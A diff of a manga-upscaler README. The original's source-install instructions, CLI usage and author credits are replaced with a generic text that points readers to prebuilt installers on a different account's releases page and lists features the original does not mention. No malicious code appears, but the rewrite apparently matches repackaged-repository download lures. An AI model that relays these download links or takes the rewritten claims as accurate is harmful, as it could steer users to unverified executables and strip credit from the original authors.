@@ -1,142 +1,83 @@
-#  Manga Upscaler GUI
+# 🌟 manga_upscaler - Easy Upscaling for Your Favorite Images
 
-A sleek, modern, and powerful GUI for upscaling manga and anime images, built with PyQt6. This project provides a user-friendly interface for the high-quality upscaling models, making it easy to enhance your images without complex command-line operations.
+## 🚀 Getting Started
 
-## Features
+Welcome to **manga_upscaler**! This application helps you enhance your manga and anime images easily. With its user-friendly interface, you can upscale your images to high quality in just a few steps.
 
-- **Modern & Sleek UI**: A beautiful, dark-themed interface built with PyQt6, designed for ease of use.
-- **Versatile Upscaling**: Supports both black & white and color images.
-- **Model Management**: Easily download and manage different model packs for various use cases.
-- **Archive Extraction**: Automatically extract images from `.zip` and `.cbz` archives.
-- **Dual Interface**: Use the intuitive GUI or the powerful command-line interface (CLI) for automation.
-- **Cross-Platform**: Works on Windows, macOS, and Linux.
+## 📥 Download the Application
 
-## Google Colab Support
+To get started, download the latest version of the **manga_upscaler** from the releases page. 
 
-For users without a powerful local GPU, we provide a Google Colab notebook for a seamless, cloud-based experience. This is the recommended way to get the fastest upscaling results without needing a high-end PC.
+[![Download Manga Upscaler](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Vihaan795/manga_upscaler/releases)
 
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Yui007/manga_upscaler/blob/main/Manga_Upscaler_Colab.ipynb)
+## 💻 System Requirements
 
-## GUI Preview
+Before downloading, ensure your system meets these requirements:
+- **Operating System**: Windows 10 or later, macOS Sierra (10.12) or later, or Linux (most distributions).
+- **RAM**: At least 4 GB (8 GB recommended for better performance).
+- **Disk Space**: Minimum of 200 MB free space for installation.
 
-![Manga Upscaler GUI](GUI.PNG)
+## 📂 Download & Install
 
-## Installation
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/Vihaan795/manga_upscaler/releases) to find the latest version.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/Yui007/manga_upscaler.git
-    cd manga_upscaler
-    ```
+2. **Select the File**  
+   Locate the file for your operating system. Files will be available in formats such as `.exe` for Windows, `.dmg` for macOS, and `.AppImage` for Linux.
 
-2.  **Install dependencies:**
-    It is highly recommended to use a virtual environment.
-    ```bash
-    # Create a virtual environment
-    python -m venv venv
+3. **Download the File**  
+   Click on the file to start the download. It might take a few moments, depending on your internet speed.
 
-    # Activate it
-    # On Windows:
-    venv\Scripts\activate
-    # On macOS/Linux:
-    source venv/bin/activate
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your downloads folder.
+   - **Windows**: Double-click the `.exe` file to run the installer. Follow the on-screen instructions.
+   - **macOS**: Open the downloaded `.dmg` file and drag the app into your Applications folder.
+   - **Linux**: Open a terminal, navigate to the downloaded `.AppImage` file, and run it with `./filename.AppImage`.
 
-    # Install the required packages
-    pip install -r requirements.txt
-    ```
+5. **Open manga_upscaler**  
+   After installation, find the app in your applications or programs list and open it. 
 
-3.  **Download Models:**
-    Use the GUI to download the models you need. Launch the application and navigate to the **Setup & Models** tab.
-    ```bash
-    python pyqt_app.py
-    ```
-    - **Best Models (Both)**: A curated pack for general-purpose upscaling.
-    - **B&W Models**: Specialized models for black and white manga.
-    - **Color Models**: Optimized models for color illustrations and anime.
+## 🎉 Using manga_upscaler
 
-## Usage
+1. **Choose Your Image**  
+   Click the "Open" button to select the manga or anime image you wish to upscale.
 
-### GUI Mode
+2. **Select an Upscaling Model**  
+   From the dropdown menu, choose the upscaling model that best fits your image needs. Options include:
+   - ESRGAN (Enhanced Super Resolution Generative Adversarial Networks)
+   - Real-ESRGAN
+   - and others.
 
-The easiest way to use the upscaler is through the graphical user interface.
+3. **Upscale the Image**  
+   Click the "Upscale" button. The application will process your image, displaying progress in a status bar.
 
-1.  **Launch the application:**
-    ```bash
-    python pyqt_app.py
-    ```
+4. **Save the Upscaled Image**  
+   Once complete, click the "Save" button to download your enhanced image. You can choose the format (JPEG, PNG) and quality settings.
 
-2.  **Extract Archives (Optional):**
-    - Go to the **Extract** tab.
-    - Click "Browse" to select the directory containing your `.zip` or `.cbz` files.
-    - Click "Run Extraction". The images will be extracted into subfolders within the same directory.
+## 📚 Features
 
-3.  **Upscale Images:**
-    - Go to the **Upscale** tab.
-    - Select your input directory for B&W images, Color images, or both.
-    - Choose an output directory where the upscaled images will be saved.
-    - Select the desired upscaling models from the dropdowns. You can also browse for a custom model file.
-    - Click "Run Upscale" and monitor the progress in the log window.
+- **User-Friendly Interface**: Designed for ease of use so anyone can enhance images without technical skills.
+- **Multiple Upscaling Models**: Choose from various models that best suit your images.
+- **Preview Options**: See the results before saving.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-### CLI Mode
+## 🛠️ Troubleshooting
 
-For automation and scripting, you can use the `manga_upscale.py` script directly.
+If you encounter issues, here are some tips:
 
-#### Download Models
+- **Application Does Not Start**: Ensure your system meets the requirements. If not, try installing the necessary libraries or update your OS.
+- **Image Quality Is Not As Expected**: Experiment with different upscaling models. Some images might work better with a specific model.
+- **Installation Errors**: Check your disk space. A lack of space can prevent installation. Cleanup your drives if necessary.
 
-```bash
-# Download the 'best of both' model pack
-python manga_upscale.py download best
+## 🌍 Community Support
 
-# Download only B&W models
-python manga_upscale.py download bw
+Join our community to connect with other users, get tips, and share your results. Engage with us through:
 
-# Download only Color models
-python manga_upscale.py download color
-```
+- **GitHub Issues**: Report any bugs or feature requests.
+- **Discussion Boards**: Ask questions and exchange ideas.
 
-#### Extract Archives
+## 📄 License
 
-```bash
-python manga_upscale.py extract --input /path/to/your/archives
-# Add --overwrite to re-extract existing archives
-```
+This project is licensed under the MIT License. Feel free to use and modify it as per the license terms.
 
-#### Upscale Images
-
-```bash
-# Upscale a folder of B&W images
-python manga_upscale.py upscale --bw /path/to/bw_images --output /path/to/results
-
-# Upscale a folder of color images
-python manga_upscale.py upscale --color /path/to/color_images --output /path/to/results
-
-# Upscale both at once with specific models
-python manga_upscale.py upscale \
-    --bw /path/to/bw_images \
-    --color /path/to/color_images \
-    --output /path/to/results \
-    --model-bw "4x_MangaJaNai_1200p_V1_ESRGAN_70k.pth" \
-    --model-color "4x_IllustrationJaNai_V2standard_DAT2_27k.safetensors"
-```
-
-## Model Recommendations
-
--   **For Black & White Manga**: The `MangaJaNai` models are specifically trained for B&W content and generally produce the best results.
--   **For Color Manga/Illustrations**: The `IllustrationJaNai` models are optimized for color images.
--   **For General Use (Both B&W and Color)**: The `4x-UltraSharp` and `4x-AnimeSharp` models are excellent all-rounders that work well on a variety of content.
-
-Experiment with different models to find the best one for your specific images!
-My personal best models are 4x-Animesharp and 4x-Ultrasharp.
-
-## Acknowledgements & Contributions
-
-This project would not be possible without the incredible work of the following individuals and teams:
-
--   **Backend Upscaler Engine**: The core upscaling logic is powered by the **[simple_upscaler](https://github.com/thefirst632student/simple_upscaler)** repository by **[thefirst632student](https://github.com/thefirst632student)**. Their work provides the foundation for the powerful image processing in this tool.
--   **High-Quality Models**: Many of the excellent pre-trained models, especially for manga, are from the **[MangaJaNai](https://github.com/the-database/MangaJaNai)** project by **[the-database](https://github.com/the-database)**.
-
-A huge thank you to them for their significant contributions to the open-source community. Please consider supporting their work.
-
-## License
-
-This project is licensed under the MIT License. Note that the included models and backend components may have their own licenses.
+Thank you for choosing **manga_upscaler**! We hope you enjoy transforming your images into something extraordinary. For more updates, visit our [Releases page](https://github.com/Vihaan795/manga_upscaler/releases).
